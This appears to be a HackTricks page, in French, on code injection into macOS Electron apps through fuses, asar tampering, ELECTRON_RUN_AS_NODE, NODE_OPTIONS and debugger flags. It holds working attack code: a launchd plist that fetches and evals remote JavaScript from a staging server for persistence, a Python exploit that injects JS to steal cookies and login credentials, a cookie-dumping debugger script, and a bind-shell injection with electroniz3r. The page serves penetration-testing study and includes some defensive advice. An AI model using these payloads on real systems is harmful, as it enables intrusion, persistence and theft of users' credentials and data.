# Injection d'applications Electron sur macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informations de base

Si vous ne savez pas ce qu'est Electron, vous pouvez trouver [**beaucoup d'informations ici**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Mais pour l'instant, sachez simplement qu'Electron exécute **node**.\
Et node a certains **paramètres** et **variables d'environnement** qui peuvent être utilisés pour **exécuter d'autres codes** en plus du fichier indiqué.

### Fusibles Electron

Ces techniques seront discutées ensuite, mais récemment, Electron a ajouté plusieurs **drapeaux de sécurité pour les empêcher**. Ce sont les [**Fusibles Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) et ce sont ceux utilisés pour **empêcher** les applications Electron sur macOS de **charger du code arbitraire** :

- **`RunAsNode`** : S'il est désactivé, il empêche l'utilisation de la variable d'environnement **`ELECTRON_RUN_AS_NODE`** pour injecter du code.
- **`EnableNodeCliInspectArguments`** : S'il est désactivé, des paramètres comme `--inspect`, `--inspect-brk` ne seront pas respectés. Évitant ainsi cette méthode pour injecter du code.
- **`EnableEmbeddedAsarIntegrityValidation`** : S'il est activé, le **fichier** **`asar`** chargé sera **validé** par macOS. **Prévenant** ainsi **l'injection de code** en modifiant le contenu de ce fichier.
- **`OnlyLoadAppFromAsar`** : S'il est activé, au lieu de chercher à charger dans l'ordre suivant : **`app.asar`**, **`app`** et enfin **`default_app.asar`**. Il ne vérifiera et n'utilisera que app.asar, garantissant ainsi que lorsqu'il est **combiné** avec le fusible **`embeddedAsarIntegrityValidation`**, il est **impossible** de **charger du code non validé**.
- **`LoadBrowserProcessSpecificV8Snapshot`** : S'il est activé, le processus du navigateur utilise le fichier appelé `browser_v8_context_snapshot.bin` pour son instantané V8.

Un autre fusible intéressant qui ne préviendra pas l'injection de code est :

- **EnableCookieEncryption** : S'il est activé, le magasin de cookies sur disque est chiffré à l'aide de clés de cryptographie au niveau du système d'exploitation.

### Vérification des fusibles Electron

Vous pouvez **vérifier ces drapeaux** à partir d'une application avec :
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modification des Fusions Electron

Comme le [**mentionnent les docs**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configuration des **Fusions Electron** est configurée à l'intérieur du **binaire Electron** qui contient quelque part la chaîne **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Dans les applications macOS, cela se trouve généralement dans `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Vous pouvez charger ce fichier dans [https://hexed.it/](https://hexed.it/) et rechercher la chaîne précédente. Après cette chaîne, vous pouvez voir en ASCII un nombre "0" ou "1" indiquant si chaque fusible est désactivé ou activé. Il suffit de modifier le code hexadécimal (`0x30` est `0` et `0x31` est `1`) pour **modifier les valeurs des fusibles**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Notez que si vous essayez de **surcharger** le **binaire `Electron Framework`** à l'intérieur d'une application avec ces octets modifiés, l'application ne fonctionnera pas.

## RCE ajout de code aux applications Electron

Il pourrait y avoir des **fichiers JS/HTML externes** qu'une application Electron utilise, donc un attaquant pourrait injecter du code dans ces fichiers dont la signature ne sera pas vérifiée et exécuter du code arbitraire dans le contexte de l'application.

> [!CAUTION]
> Cependant, pour le moment, il y a 2 limitations :
>
> - La permission **`kTCCServiceSystemPolicyAppBundles`** est **nécessaire** pour modifier une application, donc par défaut, cela n'est plus possible.
> - Le fichier compilé **`asap`** a généralement les fusibles **`embeddedAsarIntegrityValidation`** `et` **`onlyLoadAppFromAsar`** `activés`
>
> Rendant ce chemin d'attaque plus compliqué (ou impossible).

Notez qu'il est possible de contourner l'exigence de **`kTCCServiceSystemPolicyAppBundles`** en copiant l'application dans un autre répertoire (comme **`/tmp`**), en renommant le dossier **`app.app/Contents`** en **`app.app/NotCon`**, en **modifiant** le fichier **asar** avec votre code **malveillant**, en le renommant à nouveau en **`app.app/Contents`** et en l'exécutant.

Vous pouvez décompresser le code du fichier asar avec :
```bash
npx asar extract app.asar app-decomp
```
Et emballez-le à nouveau après l'avoir modifié avec :
```bash
npx asar pack app-decomp app-new.asar
```
## RCE avec ELECTRON_RUN_AS_NODE

Selon [**la documentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), si cette variable d'environnement est définie, elle démarrera le processus en tant que processus Node.js normal.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Si le fusible **`RunAsNode`** est désactivé, la variable d'environnement **`ELECTRON_RUN_AS_NODE`** sera ignorée, et cela ne fonctionnera pas.

### Injection depuis le Plist de l'App

Comme [**proposé ici**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), vous pourriez abuser de cette variable d'environnement dans un plist pour maintenir la persistance :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE avec `NODE_OPTIONS`

Vous pouvez stocker le payload dans un fichier différent et l'exécuter :
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Si le fusible **`EnableNodeOptionsEnvironmentVariable`** est **désactivé**, l'application **ignorera** la variable d'environnement **NODE_OPTIONS** lors du lancement, à moins que la variable d'environnement **`ELECTRON_RUN_AS_NODE`** ne soit définie, qui sera également **ignorée** si le fusible **`RunAsNode`** est désactivé.
>
> Si vous ne définissez pas **`ELECTRON_RUN_AS_NODE`**, vous trouverez l'**erreur** : `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection depuis le Plist de l'App

Vous pourriez abuser de cette variable d'environnement dans un plist pour maintenir la persistance en ajoutant ces clés :
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE avec inspection

Selon [**ceci**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), si vous exécutez une application Electron avec des drapeaux tels que **`--inspect`**, **`--inspect-brk`** et **`--remote-debugging-port`**, un **port de débogage sera ouvert** afin que vous puissiez vous y connecter (par exemple depuis Chrome dans `chrome://inspect`) et vous pourrez **injecter du code dessus** ou même lancer de nouveaux processus.\
Par exemple :
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
Dans [**cet article de blog**](https://hackerone.com/reports/1274695), ce débogage est abusé pour faire en sorte qu'un chrome sans tête **télécharge des fichiers arbitraires à des emplacements arbitraires**.

> [!TIP]
> Si une application a sa propre méthode pour vérifier si des variables d'environnement ou des paramètres tels que `--inspect` sont définis, vous pourriez essayer de **contourner** cela en temps réel en utilisant l'argument `--inspect-brk` qui **arrêtera l'exécution** au début de l'application et exécutera un contournement (en écrasant les arguments ou les variables d'environnement du processus actuel par exemple).

L'exploit suivant consistait à surveiller et à exécuter l'application avec le paramètre `--inspect-brk`, ce qui a permis de contourner la protection personnalisée qu'elle avait (en écrasant les paramètres du processus pour supprimer `--inspect-brk`) et ensuite d'injecter une charge utile JS pour extraire des cookies et des identifiants de l'application :
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Si le fusible **`EnableNodeCliInspectArguments`** est désactivé, l'application **ignorera les paramètres node** (comme `--inspect`) lors du lancement, à moins que la variable d'environnement **`ELECTRON_RUN_AS_NODE`** ne soit définie, qui sera également **ignorée** si le fusible **`RunAsNode`** est désactivé.
>
> Cependant, vous pouvez toujours utiliser le **paramètre electron `--remote-debugging-port=9229`**, mais le payload précédent ne fonctionnera pas pour exécuter d'autres processus.

En utilisant le paramètre **`--remote-debugging-port=9222`**, il est possible de voler certaines informations de l'application Electron comme l'**historique** (avec des commandes GET) ou les **cookies** du navigateur (car ils sont **décryptés** à l'intérieur du navigateur et il existe un **point de terminaison json** qui les fournira).

Vous pouvez apprendre comment faire cela [**ici**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) et [**ici**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) et utiliser l'outil automatique [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ou un simple script comme :
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection depuis le Plist de l'App

Vous pourriez abuser de cette variable d'environnement dans un plist pour maintenir la persistance en ajoutant ces clés :
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Contournement TCC en abusant des anciennes versions

> [!TIP]
> Le démon TCC de macOS ne vérifie pas la version exécutée de l'application. Donc, si vous **ne pouvez pas injecter de code dans une application Electron** avec l'une des techniques précédentes, vous pourriez télécharger une version antérieure de l'APP et y injecter du code car elle obtiendra toujours les privilèges TCC (à moins que le Trust Cache ne l'en empêche).

## Exécuter du code non JS

Les techniques précédentes vous permettront d'exécuter **du code JS à l'intérieur du processus de l'application electron**. Cependant, rappelez-vous que les **processus enfants s'exécutent sous le même profil de bac à sable** que l'application parente et **héritent de leurs permissions TCC**.\
Par conséquent, si vous souhaitez abuser des droits d'accès pour accéder à la caméra ou au microphone par exemple, vous pourriez simplement **exécuter un autre binaire depuis le processus**.

## Vulnérabilités notables d'Electron macOS (2023-2024)

### CVE-2023-44402 – Contournement de l'intégrité ASAR

Electron ≤22.3.23 et diverses préversions 23-27 ont permis à un attaquant ayant un accès en écriture au dossier `.app/Contents/Resources` de contourner les fusions `embeddedAsarIntegrityValidation` **et** `onlyLoadAppFromAsar`. Le bug était une *confusion de type de fichier* dans le vérificateur d'intégrité qui permettait de charger un **répertoire nommé `app.asar`** au lieu de l'archive validée, donc tout JavaScript placé à l'intérieur de ce répertoire était exécuté lorsque l'application démarrait. Même les fournisseurs qui avaient suivi les conseils de durcissement et activé les deux fusions étaient donc toujours vulnérables sur macOS.

Versions d'Electron corrigées : **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** et **27.0.0-alpha.7**. Les attaquants qui trouvent une application exécutant une version antérieure peuvent écraser `Contents/Resources/app.asar` avec leur propre répertoire pour exécuter du code avec les droits TCC de l'application.

### Cluster CVE 2024 “RunAsNode” / “enableNodeCliInspectArguments”

En janvier 2024, une série de CVEs (CVE-2024-23738 à CVE-2024-23743) a mis en évidence que de nombreuses applications Electron sont livrées avec les fusions **RunAsNode** et **EnableNodeCliInspectArguments** toujours activées. Un attaquant local peut donc relancer le programme avec la variable d'environnement `ELECTRON_RUN_AS_NODE=1` ou des drapeaux tels que `--inspect-brk` pour le transformer en un processus *générique* Node.js et hériter de toutes les permissions de bac à sable et TCC de l'application.

Bien que l'équipe d'Electron ait contesté la classification "critique" et noté qu'un attaquant a déjà besoin d'une exécution de code local, le problème reste précieux lors de l'après-exploitation car il transforme tout bundle Electron vulnérable en un binaire *living-off-the-land* qui peut par exemple lire les Contacts, Photos ou d'autres ressources sensibles précédemment accordées à l'application de bureau.

Conseils défensifs des mainteneurs d'Electron :

* Désactivez les fusions `RunAsNode` et `EnableNodeCliInspectArguments` dans les versions de production.
* Utilisez la nouvelle API **UtilityProcess** si votre application a légitimement besoin d'un processus Node.js d'assistance au lieu de réactiver ces fusions.

## Injection automatique

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

L'outil [**electroniz3r**](https://github.com/r3ggi/electroniz3r) peut être facilement utilisé pour **trouver des applications electron vulnérables** installées et y injecter du code. Cet outil essaiera d'utiliser la technique **`--inspect`** :

Vous devez le compiler vous-même et pouvez l'utiliser comme ceci :
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki a été conçu pour créer des portes dérobées dans les applications Electron en remplaçant les fichiers JavaScript des applications par les fichiers JavaScript de commande et de contrôle de Loki.


## Références

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [https://www.electronjs.org/blog/statement-run-as-node-cves](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
